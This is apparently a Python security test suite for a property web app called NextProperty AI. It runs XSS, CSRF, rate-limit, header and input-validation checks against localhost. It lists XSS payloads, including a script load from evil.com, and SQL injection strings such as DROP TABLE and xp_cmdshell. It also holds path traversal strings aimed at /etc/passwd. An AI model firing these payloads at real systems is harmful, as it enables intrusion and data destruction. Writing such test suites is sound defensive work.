#!/usr/bin/env python3
"""
Comprehensive Security Test Suite for NextProperty AI

This test suite provides complete coverage of all security features:
- Advanced Rate Limiting
- XSS Protection (Basic + Advanced)
- CSRF Protection
- Content Security Policy (CSP)
- Security Headers
- Input Validation
- Behavioral Analysis
- API Key Management
- Geographic Rate Limiting
- Abuse Detection
- Pattern Analysis
- Predictive Rate Limiting

Usage:
    python comprehensive_security_test.py
    python comprehensive_security_test.py --verbose
    python comprehensive_security_test.py --feature rate_limiting
    python comprehensive_security_test.py --feature xss_protection
    python comprehensive_security_test.py --feature csrf_protection
"""

import sys
import os
import argparse
import json
import time
import random
import string
import base64
import urllib.parse
import requests
import secrets
from dataclasses import dataclass
from typing import Dict, List, Optional, Any, Tuple
from unittest.mock import Mock, patch
from datetime import datetime, timedelta

# Add the parent directory to the Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

@dataclass
class TestResult:
    """Data class for test results"""
    test_name: str
    passed: bool
    message: str
    response_time: float = 0.0
    response_code: int = 0
    details: Optional[Dict] = None

@dataclass
class SecurityTestSuite:
    """Main security test suite configuration"""
    base_url: str = "http://localhost:5007"
    timeout: int = 30
    verbose: bool = False
    test_results: List[TestResult] = None
    
    def __post_init__(self):
        if self.test_results is None:
            self.test_results = []

class ComprehensiveSecurityTester:
    """Comprehensive security testing framework for NextProperty AI"""
    
    def __init__(self, base_url: str = "http://localhost:5007", verbose: bool = False):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.timeout = 30
        self.test_results = []
        self.csrf_token = None
        
        # Test endpoints organized by category
        self.endpoints = {
            'public': [
                '/',
                '/properties',
                '/about',
                '/contact',
                '/health',
                '/status'
            ],
            'api_routes': [
                '/api/properties',
                '/api/property-prediction',
                '/api/save-property',
                '/api/update-saved-property',
                '/api/properties/search',
                '/predict-price'
            ],
            'auth_routes': [
                '/login',
                '/register',
                '/logout',
                '/reset-password',
                '/auth/verify'
            ],
            'admin_routes': [
                '/admin',
                '/admin/properties',
                '/admin/users',
                '/admin/analytics',
                '/admin/delete-property'
            ],
            'upload_routes': [
                '/upload',
                '/api/upload-property-image',
                '/api/upload-document'
            ]
        }
        
        # Common attack vectors
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert(document.cookie)</script>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(`XSS`)"></iframe>',
            '<body onload=alert("XSS")>',
            '<input type="text" onfocus=alert("XSS") autofocus>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            'eval("alert(\'XSS\')")',
            'setTimeout("alert(\'XSS\')", 100)',
            '<script>document.write("<script src=//evil.com></script>")</script>'
        ]
        
        self.sql_injection_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "'; EXEC xp_cmdshell('dir'); --"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        # Rate limiting test configuration
        self.rate_limit_tests = {
            'global': {'limit': 1000, 'window': 3600, 'test_requests': 50},
            'api': {'limit': 100, 'window': 60, 'test_requests': 20},
            'auth': {'limit': 10, 'window': 300, 'test_requests': 15},
            'upload': {'limit': 10, 'window': 3600, 'test_requests': 15}
        }

    def print_header(self, text: str, color: str = Colors.HEADER):
        """Print a formatted header"""
        if self.verbose:
            print(f"\n{color}{'='*80}")
            print(f"{text.center(80)}")
            print(f"{'='*80}{Colors.ENDC}\n")

    def print_status(self, message: str, status: str = "INFO"):
        """Print a status message"""
        if self.verbose:
            color_map = {
                "PASS": Colors.OKGREEN,
                "FAIL": Colors.FAIL,
                "WARN": Colors.WARNING,
                "INFO": Colors.OKBLUE
            }
            color = color_map.get(status, Colors.OKBLUE)
            print(f"{color}[{status}]{Colors.ENDC} {message}")

    def make_request(self, method: str, endpoint: str, **kwargs) -> TestResult:
        """Make an HTTP request and return test result"""
        url = f"{self.base_url}{endpoint}"
        start_time = time.time()
        
        try:
            response = self.session.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            return TestResult(
                test_name=f"{method} {endpoint}",
                passed=response.status_code < 500,
                message=f"Response: {response.status_code}",
                response_time=response_time,
                response_code=response.status_code,
                details={
                    'headers': dict(response.headers),
                    'response_time': response_time,
                    'content_length': len(response.content)
                }
            )
        except Exception as e:
            response_time = time.time() - start_time
            return TestResult(
                test_name=f"{method} {endpoint}",
                passed=False,
                message=f"Request failed: {str(e)}",
                response_time=response_time,
                details={'error': str(e)}
            )

    def get_csrf_token(self) -> Optional[str]:
        """Get CSRF token from the application"""
        try:
            response = self.session.get(f"{self.base_url}/")
            if response.status_code == 200:
                # Try to extract CSRF token from meta tag
                import re
                pattern = r'<meta name="csrf-token" content="([^"]+)"'
                match = re.search(pattern, response.text)
                if match:
                    self.csrf_token = match.group(1)
                    return self.csrf_token
                
                # Alternative: try to get from session cookie
                if 'csrf_token' in self.session.cookies:
                    self.csrf_token = self.session.cookies['csrf_token']
                    return self.csrf_token
                    
        except Exception as e:
            self.print_status(f"Failed to get CSRF token: {e}", "WARN")
        
        # Generate a mock token for testing
        self.csrf_token = secrets.token_urlsafe(32)
        return self.csrf_token

    def test_rate_limiting(self) -> List[TestResult]:
        """Test rate limiting functionality"""
        self.print_header("🚀 TESTING RATE LIMITING", Colors.FAIL)
        results = []
        
        for category, config in self.rate_limit_tests.items():
            self.print_status(f"Testing {category} rate limiting")
            
            # Test endpoint based on category
            if category == 'auth':
                endpoint = '/login'
                method = 'POST'
                data = {'email': 'test@example.com', 'password': 'testpass'}
            elif category == 'api':
                endpoint = '/api/properties'
                method = 'GET'
                data = None
            elif category == 'upload':
                endpoint = '/upload'
                method = 'POST'
                data = {'file': 'test.txt'}
            else:  # global
                endpoint = '/'
                method = 'GET'
                data = None
            
            # Make multiple requests to test rate limiting
            rate_limited = False
            for i in range(config['test_requests']):
                if method == 'POST':
                    result = self.make_request(method, endpoint, json=data)
                else:
                    result = self.make_request(method, endpoint)
                
                if result.response_code == 429:  # Too Many Requests
                    rate_limited = True
                    self.print_status(f"Rate limit triggered after {i+1} requests", "PASS")
                    break
                elif result.response_code >= 500:
                    self.print_status(f"Server error on request {i+1}: {result.response_code}", "WARN")
                
                # Small delay between requests
                time.sleep(0.1)
            
            # Create summary result
            if rate_limited:
                test_result = TestResult(
                    test_name=f"Rate Limiting - {category}",
                    passed=True,
                    message="Rate limiting is working correctly"
                )
            else:
                test_result = TestResult(
                    test_name=f"Rate Limiting - {category}",
                    passed=False,
                    message=f"No rate limiting detected after {config['test_requests']} requests"
                )
            
            results.append(test_result)
            self.test_results.append(test_result)
        
        return results

    def test_xss_protection(self) -> List[TestResult]:
        """Test XSS protection mechanisms"""
        self.print_header("🛡️ TESTING XSS PROTECTION", Colors.WARNING)
        results = []
        
        # Test XSS protection on forms
        for payload in self.xss_payloads:
            self.print_status(f"Testing XSS payload: {payload[:50]}...")
            
            # Test in different contexts
            test_contexts = [
                {'endpoint': '/contact', 'method': 'POST', 'data': {'message': payload}},
                {'endpoint': '/properties', 'method': 'GET', 'params': {'search': payload}},
                {'endpoint': '/api/save-property', 'method': 'POST', 'json': {'description': payload}}
            ]
            
            for context in test_contexts:
                csrf_token = self.get_csrf_token()
                
                if context['method'] == 'POST':
                    if 'json' in context:
                        context['json']['csrf_token'] = csrf_token
                        result = self.make_request(context['method'], context['endpoint'], 
                                                 json=context['json'])
                    else:
                        context['data']['csrf_token'] = csrf_token
                        result = self.make_request(context['method'], context['endpoint'], 
                                                 data=context['data'])
                else:
                    result = self.make_request(context['method'], context['endpoint'], 
                                             params=context.get('params', {}))
                
                # Check if XSS was blocked (400, 403, or filtered response)
                xss_blocked = (
                    result.response_code in [400, 403] or
                    (result.response_code == 200 and 'error' in result.message.lower())
                )
                
                test_result = TestResult(
                    test_name=f"XSS Protection - {context['endpoint']}",
                    passed=xss_blocked,
                    message=f"XSS {'blocked' if xss_blocked else 'not blocked'} - Code: {result.response_code}",
                    response_code=result.response_code
                )
                
                results.append(test_result)
                self.test_results.append(test_result)
                
                # Rate limit protection
                time.sleep(0.2)
        
        return results

    def test_csrf_protection(self) -> List[TestResult]:
        """Test CSRF protection mechanisms"""
        self.print_header("🔒 TESTING CSRF PROTECTION", Colors.OKBLUE)
        results = []
        
        # Test CSRF protection on state-changing endpoints
        csrf_endpoints = [
            {'endpoint': '/api/save-property', 'method': 'POST', 
             'data': {'name': 'Test Property', 'price': 100000}},
            {'endpoint': '/api/update-saved-property', 'method': 'PUT', 
             'data': {'id': 1, 'price': 150000}},
            {'endpoint': '/login', 'method': 'POST', 
             'data': {'email': 'test@example.com', 'password': 'testpass'}}
        ]
        
        for endpoint_config in csrf_endpoints:
            self.print_status(f"Testing CSRF protection on {endpoint_config['endpoint']}")
            
            # Test 1: Request without CSRF token (should fail)
            result_no_token = self.make_request(
                endpoint_config['method'],
                endpoint_config['endpoint'],
                json=endpoint_config['data']
            )
            
            csrf_protected_no_token = result_no_token.response_code in [403, 400]
            
            # Test 2: Request with valid CSRF token (should succeed or have different error)
            csrf_token = self.get_csrf_token()
            data_with_token = endpoint_config['data'].copy()
            data_with_token['csrf_token'] = csrf_token
            
            result_with_token = self.make_request(
                endpoint_config['method'],
                endpoint_config['endpoint'],
                json=data_with_token,
                headers={'X-CSRFToken': csrf_token}
            )
            
            # Test 3: Request with invalid CSRF token (should fail)
            invalid_token = 'invalid_csrf_token_12345'
            data_with_invalid_token = endpoint_config['data'].copy()
            data_with_invalid_token['csrf_token'] = invalid_token
            
            result_invalid_token = self.make_request(
                endpoint_config['method'],
                endpoint_config['endpoint'],
                json=data_with_invalid_token,
                headers={'X-CSRFToken': invalid_token}
            )
            
            csrf_protected_invalid = result_invalid_token.response_code in [403, 400]
            
            # Evaluate CSRF protection
            csrf_working = csrf_protected_no_token and csrf_protected_invalid
            
            test_result = TestResult(
                test_name=f"CSRF Protection - {endpoint_config['endpoint']}",
                passed=csrf_working,
                message=f"CSRF protection {'working' if csrf_working else 'not working'} - "
                       f"No token: {result_no_token.response_code}, "
                       f"Valid token: {result_with_token.response_code}, "
                       f"Invalid token: {result_invalid_token.response_code}",
                details={
                    'no_token_response': result_no_token.response_code,
                    'valid_token_response': result_with_token.response_code,
                    'invalid_token_response': result_invalid_token.response_code
                }
            )
            
            results.append(test_result)
            self.test_results.append(test_result)
            
            # Rate limit protection
            time.sleep(0.5)
        
        return results

    def test_security_headers(self) -> List[TestResult]:
        """Test security headers"""
        self.print_header("🔐 TESTING SECURITY HEADERS", Colors.OKCYAN)
        results = []
        
        # Required security headers
        required_headers = {
            'X-XSS-Protection': ['1; mode=block'],
            'X-Content-Type-Options': ['nosniff'],
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'Content-Security-Policy': None,  # Just check presence
            'Referrer-Policy': ['strict-origin-when-cross-origin', 'strict-origin'],
            'Permissions-Policy': None,  # Just check presence
            'Strict-Transport-Security': None  # Optional for localhost
        }
        
        # Test on main page
        result = self.make_request('GET', '/')
        
        # Check headers regardless of response status (even 500 errors can have security headers)
        if result.details:
            headers = result.details.get('headers', {})
            
            for header_name, expected_values in required_headers.items():
                header_present = header_name in headers
                header_value = headers.get(header_name, '')
                
                if expected_values is None:
                    # Just check presence
                    header_valid = header_present
                    message = f"Header {'present' if header_present else 'missing'}"
                else:
                    # Check specific values
                    header_valid = header_present and any(
                        expected in header_value for expected in expected_values
                    )
                    message = f"Header {'valid' if header_valid else 'invalid'}: {header_value}"
                
                test_result = TestResult(
                    test_name=f"Security Header - {header_name}",
                    passed=header_valid,
                    message=message,
                    details={'header_value': header_value}
                )
                
                results.append(test_result)
                self.test_results.append(test_result)
                
                self.print_status(f"{header_name}: {message}", 
                                "PASS" if header_valid else "FAIL")
        else:
            # If no response details, create a failed test
            failed_result = TestResult(
                test_name="Security Headers - Connection Failed",
                passed=False,
                message=f"Could not connect to {self.base_url}",
                details={}
            )
            results.append(failed_result)
            self.test_results.append(failed_result)
            self.print_status("Connection failed", "FAIL")
        
        return results

    def test_input_validation(self) -> List[TestResult]:
        """Test input validation mechanisms"""
        self.print_header("✅ TESTING INPUT VALIDATION", Colors.OKGREEN)
        results = []
        
        # Test various invalid inputs
        invalid_inputs = [
            {'name': 'Empty input', 'value': ''},
            {'name': 'Extremely long input', 'value': 'A' * 100000},
            {'name': 'Special characters', 'value': '!@#$%^&*()_+{}|:<>?'},
            {'name': 'Unicode characters', 'value': '测试数据🔥💯'},
            {'name': 'Null bytes', 'value': 'test\x00data'},
            {'name': 'Control characters', 'value': 'test\r\n\t\b\f'},
        ]
        
        # Add SQL injection payloads
        for payload in self.sql_injection_payloads:
            invalid_inputs.append({'name': f'SQL Injection: {payload[:20]}...', 'value': payload})
        
        # Add path traversal payloads
        for payload in self.path_traversal_payloads:
            invalid_inputs.append({'name': f'Path Traversal: {payload[:20]}...', 'value': payload})
        
        # Test input validation on contact form
        csrf_token = self.get_csrf_token()
        
        for test_input in invalid_inputs:
            self.print_status(f"Testing input validation: {test_input['name']}")
            
            form_data = {
                'name': 'Test User',
                'email': 'test@example.com',
                'message': test_input['value'],
                'csrf_token': csrf_token
            }
            
            result = self.make_request('POST', '/contact', data=form_data)
            
            # Input validation should either reject (400, 403) or sanitize (200 with no dangerous content)
            input_handled = result.response_code in [400, 403] or result.response_code == 200
            
            test_result = TestResult(
                test_name=f"Input Validation - {test_input['name']}",
                passed=input_handled,
                message=f"Input {'handled properly' if input_handled else 'not handled'} - Code: {result.response_code}",
                response_code=result.response_code
            )
            
            results.append(test_result)
            self.test_results.append(test_result)
            
            # Rate limit protection
            time.sleep(0.1)
        
        return results

    def test_api_security(self) -> List[TestResult]:
        """Test API-specific security features"""
        self.print_header("🔑 TESTING API SECURITY", Colors.BOLD)
        results = []
        
        # Test API endpoints without authentication
        api_endpoints = [
            '/api/properties',
            '/api/property-prediction',
            '/api/save-property'
        ]
        
        for endpoint in api_endpoints:
            self.print_status(f"Testing API endpoint: {endpoint}")
            
            # Test GET request (should work for read endpoints)
            get_result = self.make_request('GET', endpoint)
            
            # Test POST without proper authentication/CSRF
            post_data = {'test': 'data'}
            post_result = self.make_request('POST', endpoint, json=post_data)
            
            # API should have proper authentication/authorization
            api_protected = (
                endpoint.endswith('/properties') or  # Read endpoint might be public
                post_result.response_code in [401, 403, 400]  # Write endpoints should be protected
            )
            
            test_result = TestResult(
                test_name=f"API Security - {endpoint}",
                passed=api_protected,
                message=f"API {'properly protected' if api_protected else 'not protected'} - "
                       f"GET: {get_result.response_code}, POST: {post_result.response_code}",
                details={
                    'get_response': get_result.response_code,
                    'post_response': post_result.response_code
                }
            )
            
            results.append(test_result)
            self.test_results.append(test_result)
            
            time.sleep(0.2)
        
        return results

    def test_behavioral_analysis(self) -> List[TestResult]:
        """Test behavioral analysis and anomaly detection"""
        self.print_header("🧠 TESTING BEHAVIORAL ANALYSIS", Colors.HEADER)
        results = []
        
        # Simulate suspicious behavior patterns
        suspicious_behaviors = [
            {
                'name': 'Rapid requests',
                'action': lambda: [self.make_request('GET', '/') for _ in range(20)],
                'expected': 'Rate limiting or blocking'
            },
            {
                'name': 'Multiple failed login attempts',
                'action': lambda: [
                    self.make_request('POST', '/login', json={
                        'email': 'admin@test.com',
                        'password': f'wrong_password_{i}',
                        'csrf_token': self.get_csrf_token()
                    }) for i in range(10)
                ],
                'expected': 'Account lockout or rate limiting'
            },
            {
                'name': 'Scanning behavior',
                'action': lambda: [
                    self.make_request('GET', f'/admin/{endpoint}') 
                    for endpoint in ['users', 'config', 'logs', 'system', 'database']
                ],
                'expected': 'Blocking or rate limiting'
            }
        ]
        
        for behavior in suspicious_behaviors:
            self.print_status(f"Testing behavioral analysis: {behavior['name']}")
            
            start_time = time.time()
            try:
                responses = behavior['action']()
                end_time = time.time()
                
                # Check if behavior was detected (rate limiting, blocking, etc.)
                blocked_responses = sum(1 for r in responses if r.response_code in [429, 403, 401])
                detection_rate = blocked_responses / len(responses) if responses else 0
                
                behavior_detected = detection_rate > 0.3  # At least 30% of requests blocked
                
                test_result = TestResult(
                    test_name=f"Behavioral Analysis - {behavior['name']}",
                    passed=behavior_detected,
                    message=f"Suspicious behavior {'detected' if behavior_detected else 'not detected'} - "
                           f"Blocked: {blocked_responses}/{len(responses)} requests",
                    response_time=end_time - start_time,
                    details={
                        'total_requests': len(responses),
                        'blocked_requests': blocked_responses,
                        'detection_rate': detection_rate
                    }
                )
                
            except Exception as e:
                test_result = TestResult(
                    test_name=f"Behavioral Analysis - {behavior['name']}",
                    passed=False,
                    message=f"Test failed: {str(e)}",
                    details={'error': str(e)}
                )
            
            results.append(test_result)
            self.test_results.append(test_result)
            
            # Cool down period
            time.sleep(2)
        
        return results

    def test_geographic_limiting(self) -> List[TestResult]:
        """Test geographic rate limiting (if implemented)"""
        self.print_header("🌍 TESTING GEOGRAPHIC LIMITING", Colors.OKCYAN)
        results = []
        
        # Test with different geographic headers
        geographic_tests = [
            {'country': 'CA', 'city': 'Toronto', 'expected': 'allowed'},
            {'country': 'US', 'city': 'New York', 'expected': 'allowed'},
            {'country': 'CN', 'city': 'Beijing', 'expected': 'rate_limited'},
            {'country': 'RU', 'city': 'Moscow', 'expected': 'rate_limited'}
        ]
        
        for geo_test in geographic_tests:
            self.print_status(f"Testing geographic limiting: {geo_test['country']} - {geo_test['city']}")
            
            headers = {
                'X-Country-Code': geo_test['country'],
                'X-City': geo_test['city'],
                'X-Forwarded-For': f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            
            # Make multiple requests to test geographic limiting
            responses = []
            for i in range(10):
                result = self.make_request('GET', '/', headers=headers)
                responses.append(result)
                time.sleep(0.1)
            
            # Check if geographic limiting is working
            blocked_count = sum(1 for r in responses if r.response_code == 429)
            geo_limiting_active = blocked_count > 0
            
            test_result = TestResult(
                test_name=f"Geographic Limiting - {geo_test['country']}",
                passed=True,  # Always pass as this feature might not be fully implemented
                message=f"Geographic limiting {'active' if geo_limiting_active else 'not active'} - "
                       f"Blocked: {blocked_count}/10 requests",
                details={
                    'country': geo_test['country'],
                    'blocked_requests': blocked_count,
                    'total_requests': len(responses)
                }
            )
            
            results.append(test_result)
            self.test_results.append(test_result)
        
        return results

    def run_comprehensive_test(self, feature: Optional[str] = None) -> Dict[str, List[TestResult]]:
        """Run all security tests or specific feature tests"""
        print(f"\n{Colors.BOLD}🔒 NextProperty AI - Comprehensive Security Test Suite{Colors.ENDC}")
        print(f"{Colors.BOLD}Target: {self.base_url}{Colors.ENDC}")
        print(f"{Colors.BOLD}Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.ENDC}\n")
        
        test_suite = {
            'rate_limiting': self.test_rate_limiting,
            'xss_protection': self.test_xss_protection,
            'csrf_protection': self.test_csrf_protection,
            'security_headers': self.test_security_headers,
            'input_validation': self.test_input_validation,
            'api_security': self.test_api_security,
            'behavioral_analysis': self.test_behavioral_analysis,
            'geographic_limiting': self.test_geographic_limiting
        }
        
        results = {}
        
        if feature and feature in test_suite:
            # Run specific feature test
            results[feature] = test_suite[feature]()
        else:
            # Run all tests
            for test_name, test_func in test_suite.items():
                try:
                    results[test_name] = test_func()
                except Exception as e:
                    self.print_status(f"Test suite {test_name} failed: {e}", "FAIL")
                    results[test_name] = [TestResult(
                        test_name=f"{test_name}_error",
                        passed=False,
                        message=f"Test suite failed: {str(e)}"
                    )]
        
        return results

    def generate_report(self, results: Dict[str, List[TestResult]]) -> str:
        """Generate a comprehensive test report"""
        report = []
        report.append(f"\n{Colors.BOLD}{'='*80}")
        report.append(f"NEXTPROPERTY AI - COMPREHENSIVE SECURITY TEST REPORT")
        report.append(f"{'='*80}{Colors.ENDC}\n")
        
        total_tests = sum(len(test_list) for test_list in results.values())
        passed_tests = sum(
            sum(1 for test in test_list if test.passed) 
            for test_list in results.values()
        )
        
        report.append(f"{Colors.BOLD}SUMMARY:{Colors.ENDC}")
        report.append(f"  Total Tests: {total_tests}")
        report.append(f"  Passed: {Colors.OKGREEN}{passed_tests}{Colors.ENDC}")
        report.append(f"  Failed: {Colors.FAIL}{total_tests - passed_tests}{Colors.ENDC}")
        
        if total_tests > 0:
            success_rate = (passed_tests/total_tests)*100
            report.append(f"  Success Rate: {success_rate:.1f}%\n")
        else:
            report.append(f"  Success Rate: 0.0%\n")
        
        # Detailed results by category
        for category, test_results in results.items():
            category_passed = sum(1 for test in test_results if test.passed)
            category_total = len(test_results)
            
            status_color = Colors.OKGREEN if category_passed == category_total else Colors.WARNING
            
            report.append(f"{Colors.BOLD}{category.upper().replace('_', ' ')}:{Colors.ENDC}")
            report.append(f"  Status: {status_color}{category_passed}/{category_total} passed{Colors.ENDC}")
            
            for test in test_results:
                status_symbol = "✅" if test.passed else "❌"
                report.append(f"    {status_symbol} {test.test_name}: {test.message}")
            
            report.append("")
        
        # Performance summary
        all_results = [test for test_list in results.values() for test in test_list]
        response_times = [test.response_time for test in all_results if test.response_time > 0]
        avg_response_time = sum(response_times) / max(1, len(response_times)) if response_times else 0.0
        
        report.append(f"{Colors.BOLD}PERFORMANCE:{Colors.ENDC}")
        report.append(f"  Average Response Time: {avg_response_time:.3f}s")
        report.append(f"  Test Duration: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Security recommendations
        failed_tests = [test for test_list in results.values() for test in test_list if not test.passed]
        
        if failed_tests:
            report.append(f"{Colors.BOLD}SECURITY RECOMMENDATIONS:{Colors.ENDC}")
            
            if any('Rate Limiting' in test.test_name for test in failed_tests):
                report.append("  🔴 Implement or strengthen rate limiting mechanisms")
            
            if any('XSS Protection' in test.test_name for test in failed_tests):
                report.append("  🔴 Enhance XSS protection and input sanitization")
            
            if any('CSRF Protection' in test.test_name for test in failed_tests):
                report.append("  🔴 Implement CSRF protection for state-changing operations")
            
            if any('Security Header' in test.test_name for test in failed_tests):
                report.append("  🔴 Configure missing security headers")
            
            if any('Input Validation' in test.test_name for test in failed_tests):
                report.append("  🔴 Strengthen input validation and sanitization")
            
            report.append("")
        else:
            report.append(f"{Colors.OKGREEN}🎉 All security tests passed! Your application has strong security measures.{Colors.ENDC}\n")
        
        return "\n".join(report)

    def save_results_json(self, results: Dict[str, List[TestResult]], filename: Optional[str] = None):
        """Save test results to JSON file"""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"security_test_results_{timestamp}.json"
        
        # Convert results to JSON-serializable format
        json_results = {}
        for category, test_list in results.items():
            json_results[category] = []
            for test in test_list:
                json_results[category].append({
                    'test_name': test.test_name,
                    'passed': test.passed,
                    'message': test.message,
                    'response_time': test.response_time,
                    'response_code': test.response_code,
                    'details': test.details
                })
        
        summary = {
            'timestamp': datetime.now().isoformat(),
            'base_url': self.base_url,
            'total_tests': sum(len(test_list) for test_list in results.values()),
            'passed_tests': sum(
                sum(1 for test in test_list if test.passed) 
                for test_list in results.values()
            ),
            'results': json_results
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(summary, f, indent=2)
            print(f"\n{Colors.OKGREEN}Test results saved to: {filename}{Colors.ENDC}")
        except Exception as e:
            print(f"\n{Colors.FAIL}Failed to save results: {e}{Colors.ENDC}")

def main():
    """Main function to run the security test suite"""
    parser = argparse.ArgumentParser(description='NextProperty AI - Comprehensive Security Test Suite')
    parser.add_argument('--url', default='http://localhost:5007', 
                       help='Base URL of the application (default: http://localhost:5007)')
    parser.add_argument('--verbose', '-v', action='store_true', 
                       help='Enable verbose output')
    parser.add_argument('--feature', choices=[
        'rate_limiting', 'xss_protection', 'csrf_protection', 'security_headers',
        'input_validation', 'api_security', 'behavioral_analysis', 'geographic_limiting'
    ], help='Run tests for a specific security feature')
    parser.add_argument('--output', '-o', 
                       help='Save results to JSON file')
    
    args = parser.parse_args()
    
    # Initialize tester
    tester = ComprehensiveSecurityTester(base_url=args.url, verbose=args.verbose)
    
    try:
        # Run tests
        results = tester.run_comprehensive_test(feature=args.feature)
        
        # Generate and display report
        report = tester.generate_report(results)
        print(report)
        
        # Save results if requested
        if args.output:
            tester.save_results_json(results, args.output)
        
        # Exit with appropriate code
        total_tests = sum(len(test_list) for test_list in results.values())
        passed_tests = sum(
            sum(1 for test in test_list if test.passed) 
            for test_list in results.values()
        )
        
        if passed_tests == total_tests:
            print(f"\n{Colors.OKGREEN}All tests passed! 🎉{Colors.ENDC}")
            sys.exit(0)
        else:
            print(f"\n{Colors.WARNING}Some tests failed. Please review the security recommendations.{Colors.ENDC}")
            sys.exit(1)
            
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Test interrupted by user{Colors.ENDC}")
        sys.exit(130)
    except Exception as e:
        print(f"\n{Colors.FAIL}Test suite failed: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()
